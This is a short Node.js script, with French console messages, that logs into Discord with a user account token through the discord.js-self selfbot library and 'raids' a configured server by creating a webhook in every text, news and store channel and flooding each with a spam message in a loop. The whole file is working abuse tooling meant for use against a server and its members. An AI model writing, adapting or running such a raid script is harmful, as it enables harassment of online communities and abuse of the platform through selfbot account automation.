const discord = require("discord.js-self");
const colors = require("colors");
const config = require("./config.json");

const client = new discord.Client({ fetchAllMembers: true});
client.login(config.token);

client.on("ready", async () => {
    console.log(`Bot prêt à raid`.bgGreen.black);
    if(!config.serv)return console.log("Vous devez entrer l'id du serveur à raid.".bgRed.black);

    const servRaid = client.guilds.cache.get(config.serv);
    if(!servRaid)return console.log(`L'id que vous avez entré ne correspond pas à mes serveurs.`.bgRed.black);

    servRaid.channels.cache.forEach(async channel => {
        if(channel.type === "text" || channel.type === "news" || channel.type === "store"){
            channel.createWebhook(config.webhook.name, {
                avatar: config.webhook.avatar,
            }).then(webhook => {
                counter = 0;
                while (counter < config.ChannellMsgCount) {
                    webhook.send(config.webhook.spamMsg)
                    counter++;
                  }
            })
    } else {
        return;
    }
    })
})
